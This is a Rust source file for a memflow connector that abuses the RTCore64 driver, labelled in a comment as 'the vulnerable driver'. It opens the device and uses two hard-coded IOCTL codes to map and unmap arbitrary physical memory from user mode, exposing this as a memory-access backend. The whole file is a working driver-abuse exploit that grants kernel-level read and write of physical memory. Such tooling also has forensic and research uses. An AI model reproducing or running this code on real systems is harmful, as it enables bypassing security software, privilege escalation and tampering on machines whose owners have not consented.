pub use error::{Error, Result};

use std::any::Any;
use std::mem;

use memflow::prelude::v1::*;

use memflow_vdm::{MapPhysMemResult, MapPhysMemResultBoxed, PhysAddr, PhysMem, VdmCtx, VirtAddr};

use windows::core::s;
use windows::Win32::Foundation::{CloseHandle, GENERIC_READ, GENERIC_WRITE, HANDLE};
use windows::Win32::Storage::FileSystem::{CreateFileA, FILE_ATTRIBUTE_NORMAL, OPEN_EXISTING};
use windows::Win32::System::IO::DeviceIoControl;

pub mod error;

#[repr(u32)]
enum IoCtlCode {
    MapPhysMem = 0x80002000,
    UnmapPhysMem = 0x80002004,
}

#[derive(Debug)]
#[repr(C)]
struct MapPhysMemRequest {
    /// Physical address to map.
    addr: PhysAddr,

    /// Size of the memory to map.
    size: u32,
}

#[derive(Debug)]
#[repr(C)]
struct MapPhysMemResponse {
    /// Virtual address of the mapped memory.
    addr: VirtAddr,
}

impl Default for MapPhysMemResponse {
    #[inline]
    fn default() -> Self {
        Self {
            addr: VirtAddr::new(0),
        }
    }
}

impl MapPhysMemResult for MapPhysMemResponse {
    #[inline]
    fn as_any(&self) -> &dyn Any {
        self
    }

    #[inline]
    fn virt_addr(&self) -> VirtAddr {
        self.addr
    }
}

#[derive(Debug)]
#[repr(C)]
struct UnmapPhysMemRequest {
    /// Virtual address of the memory to unmap.
    addr: VirtAddr,
}

#[derive(Clone, Debug)]
pub struct RtCore64 {
    /// Handle to the vulnerable driver.
    pub handle: HANDLE,
}

impl RtCore64 {
    pub fn new() -> Result<Self> {
        let handle = unsafe {
            CreateFileA(
                s!(r"\\.\RTCore64"),
                GENERIC_READ.0 | GENERIC_WRITE.0,
                Default::default(),
                None,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                None,
            )?
        };

        Ok(Self { handle })
    }
}

impl Drop for RtCore64 {
    #[inline]
    fn drop(&mut self) {
        if !self.handle.is_invalid() {
            unsafe { _ = CloseHandle(self.handle) }
        }
    }
}

impl PhysMem for RtCore64 {
    fn map_phys_mem(
        &self,
        addr: PhysAddr,
        size: usize,
    ) -> memflow_vdm::Result<MapPhysMemResultBoxed> {
        let req = MapPhysMemRequest {
            addr,
            size: size as u32,
        };

        let mut res = MapPhysMemResponse::default();

        unsafe {
            DeviceIoControl(
                self.handle,
                IoCtlCode::MapPhysMem as u32,
                Some(&req as *const _ as *const _),
                mem::size_of::<MapPhysMemRequest>() as u32,
                Some(&mut res as *mut _ as *mut _),
                mem::size_of::<MapPhysMemResponse>() as u32,
                None,
                None,
            )?;
        }

        Ok(Box::new(res))
    }

    fn unmap_phys_mem(&self, result: MapPhysMemResultBoxed) -> memflow_vdm::Result<()> {
        let res = result
            .as_any()
            .downcast_ref::<MapPhysMemResponse>()
            .unwrap();

        let req = UnmapPhysMemRequest {
            addr: res.virt_addr(),
        };

        unsafe {
            DeviceIoControl(
                self.handle,
                IoCtlCode::UnmapPhysMem as u32,
                Some(&req as *const _ as *const _),
                mem::size_of::<UnmapPhysMemRequest>() as u32,
                None,
                0,
                None,
                None,
            )
            .map_err(Into::into)
        }
    }
}

#[connector(name = "rtcore")]
pub fn create_connector(_args: &ConnectorArgs) -> memflow::error::Result<VdmCtx> {
    let rt = RtCore64::new().map_err(|_| memflow::error::Error::from(ErrorOrigin::Connector))?;

    Ok(VdmCtx::new(Box::new(rt)))
}
